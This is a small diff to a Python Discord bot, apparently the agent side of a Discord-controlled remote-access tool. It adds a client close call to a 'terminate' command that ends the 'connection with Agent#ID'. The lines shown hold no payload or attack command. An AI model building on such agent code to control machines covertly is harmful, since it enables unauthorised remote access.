@@ -397,6 +397,7 @@ async def terminate(context):
     if int(word_list[0]) == int(ID):  
         my_embed = discord.Embed(title=f"Terminating Connection With Agent#{ID}", color=0x00FF00)
         await context.message.channel.send(embed=my_embed)
+        await client.close()        
         exit()
     else:
         pass
